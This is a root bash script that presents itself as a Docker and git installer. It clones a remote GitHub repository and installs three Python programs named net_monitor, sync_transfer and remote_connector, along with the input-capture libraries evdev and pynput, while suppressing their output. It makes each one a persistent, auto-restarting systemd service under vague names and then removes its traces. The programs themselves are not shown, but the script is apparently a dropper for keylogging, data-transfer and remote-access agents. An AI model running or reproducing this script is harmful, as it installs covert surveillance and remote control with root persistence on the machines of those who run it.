#!/usr/bin/env bash
((EUID))&&echo "Run as root!"&&exit 1
r="https://github.com/YoubaDJAOUTI/docker_git_install.git"
s1="net_monitor.py";s2="sync_transfer.py";s3="remote_connector.py"
td="/tmp/install_agents_repo";id="/usr/local/bin"
a1="net_monitor";a2="sync_transfer";a3="remote_connector"
sv1="net-monitor.service";sv2="sync-transfer.service";sv3="remote-connector.service"
p="/usr/bin/python3"
apt-get -y update&&apt-get -y upgrade&&apt-get install -y python3 python3-pip docker.io git||exit 1
systemctl enable docker;systemctl start docker
pip3 install --upgrade evdev requests pynput &>/dev/null
rm -rf "$td"
git clone "$r" "$td" &>/dev/null||exit 1
[[ -f "$td/$s1" ]]&&mv "$td/$s1" "$id/$a1"&&chmod +x "$id/$a1"
[[ -f "$td/$s2" ]]&&mv "$td/$s2" "$id/$a2"&&chmod +x "$id/$a2"
[[ -f "$td/$s3" ]]&&mv "$td/$s3" "$id/$a3"&&chmod +x "$id/$a3"
sd="/etc/systemd/system"
echo "[Unit]
Description=NMA
After=network.target
[Service]
Type=simple
ExecStart=$p $id/$a1
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target" > "$sd/$sv1"
echo "[Unit]
Description=STA
After=network.target
[Service]
Type=simple
ExecStart=$p $id/$a2
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target" > "$sd/$sv2"
echo "[Unit]
Description=RCA
After=network.target
[Service]
Type=simple
ExecStart=$p $id/$a3
Restart=always
RestartSec=5
[Install]
WantedBy=multi-user.target" > "$sd/$sv3"
systemctl daemon-reload
systemctl enable "$sv1"&&systemctl start "$sv1"
systemctl enable "$sv2"&&systemctl start "$sv2"
systemctl enable "$sv3"&&systemctl start "$sv3"
rm -rf "$td"
